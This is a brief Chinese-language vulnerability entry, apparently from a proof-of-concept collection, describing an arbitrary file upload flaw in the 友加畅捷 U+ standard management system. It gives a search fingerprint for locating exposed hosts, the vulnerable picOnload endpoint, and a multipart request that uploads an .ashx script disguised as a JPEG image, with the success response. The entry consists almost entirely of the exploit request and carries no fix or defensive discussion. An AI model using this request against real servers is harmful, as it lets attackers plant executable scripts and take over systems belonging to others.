# 友加畅捷管理系统U+标准版picOnload任意文件上传漏洞

友加畅捷管理系统U+标准版picOnload ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="2049187099"`
- **请求**：`POST /Other/picOnload?SessionID=xxxx HTTP/1.1`

**Payload**
```
------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="1.ashx"
Content-Type: image/jpeg
xxx
------WebKitFormBoundary123--
```
- **响应特征**：200